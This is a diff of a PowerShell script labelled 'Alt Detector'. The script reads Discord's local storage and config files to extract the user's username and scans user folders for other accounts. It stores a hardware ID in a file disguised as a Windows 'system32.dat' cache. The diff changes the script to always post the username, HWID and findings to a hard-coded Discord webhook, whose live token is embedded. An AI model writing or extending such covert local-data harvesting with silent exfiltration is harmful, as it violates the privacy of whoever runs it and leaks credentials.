@@ -1,4 +1,4 @@
-$webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN"
+$webhookUrl = "https://discord.com/api/webhooks/1484711697565614150/KHVQI7KIhvUOchJE2srJIznPqtJdULv-Y9yjGE-Zghi5R5ersc65sJNGl5CdABYVT0Oa"
 $startPath = "C:\Users"
 $hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
 $hwidFile = "$hwidFolder\system32.dat"
@@ -26,26 +26,59 @@ function Get-HWID {
 
 $hwid = Get-HWID
 
-# Get Discord username from local files
+# Get Discord username from multiple sources
 function Get-DiscordUsername {
-    $discordPaths = @(
-        "$env:APPDATA\discord\Local Storage\leveldb",
-        "$env:APPDATA\discord\Local Storage\*.log"
-    )
+    $username = "Unknown"
     
+    # Method 1: Check Discord's leveldb files for username
     try {
-        $tokenFiles = Get-ChildItem -Path "$env:APPDATA\discord\Local Storage\leveldb" -Filter "*.log" -ErrorAction SilentlyContinue
-        foreach ($file in $tokenFiles) {
-            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
-            if ($content -match '"([a-zA-Z0-9_]{2,32})"') {
-                return $Matches[1]
+        $discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
+        if (Test-Path $discordPath) {
+            $files = Get-ChildItem -Path $discordPath -Filter "*.log" -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                # Look for username patterns in Discord data
+                if ($content -match '"username":"([^"]+)"') {
+                    $username = $Matches[1]
+                    return $username
+                }
+                if ($content -match '"global_name":"([^"]+)"') {
+                    $username = $Matches[1]
+                    return $username
+                }
+                if ($content -match '"tag":"([^"]+)"') {
+                    $username = $Matches[1]
+                    return $username
+                }
             }
         }
-    }
-    catch {
-        return "Unknown"
-    }
-    return "Unknown"
+    } catch {}
+    
+    # Method 2: Check Discord's settings file
+    try {
+        $settingsPath = "$env:APPDATA\discord\settings.json"
+        if (Test-Path $settingsPath) {
+            $settings = Get-Content $settingsPath -Raw -ErrorAction SilentlyContinue
+            if ($settings -match '"username":"([^"]+)"') {
+                $username = $Matches[1]
+                return $username
+            }
+        }
+    } catch {}
+    
+    # Method 3: Check Discord's Local State file
+    try {
+        $localStatePath = "$env:APPDATA\discord\Local State"
+        if (Test-Path $localStatePath) {
+            $localState = Get-Content $localStatePath -Raw -ErrorAction SilentlyContinue
+            if ($localState -match '"username":"([^"]+)"') {
+                $username = $Matches[1]
+                return $username
+            }
+        }
+    } catch {}
+    
+    return $username
 }
 
 $discordUser = Get-DiscordUsername
@@ -126,7 +159,7 @@ if ($newAlts.Count -gt 0) {
     Set-Content -Path $hwidFile -Value $encrypted -Force
 }
 
-# Send results in elegant embed format with Discord username
+# Always send a message, even if no new alts
 if ($newAlts.Count -gt 0) {
     Write-Host "`nNew alts found:" -ForegroundColor Cyan
     $counter = 1
@@ -137,7 +170,7 @@ if ($newAlts.Count -gt 0) {
         $counter++
     }
     
-    # Create embed
+    # Create embed for new alts
     $embed = @{
         title = "ALT ACCOUNTS DETECTED"
         color = 0x9B59B6
@@ -147,14 +180,31 @@ if ($newAlts.Count -gt 0) {
         }
         timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
     }
-    
-    $payload = @{
-        embeds = @($embed)
-        username = "Alt Detector"
-    } | ConvertTo-Json -Depth 3
-    
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-    Write-Host "`nResults sent to Discord!" -ForegroundColor Green
 } else {
     Write-Host "No new alts found." -ForegroundColor Yellow
+    
+    # Create embed for no new alts
+    $description = "**Discord Account:** $discordUser`n`nNo new alt accounts were found on this system."
+    if ($storedAlts.Count -gt 0) {
+        $description += "`n`nPreviously detected alts: $($storedAlts.Count) total"
+    }
+    
+    $embed = @{
+        title = "ALT ACCOUNTS CHECK"
+        color = 0x3498DB
+        description = $description
+        footer = @{
+            text = "HWID: $hwid"
+        }
+        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+    }
 }
+
+# Send to Discord
+$payload = @{
+    embeds = @($embed)
+    username = "Alt Detector"
+} | ConvertTo-Json -Depth 3
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+Write-Host "Results sent to Discord!" -ForegroundColor Green
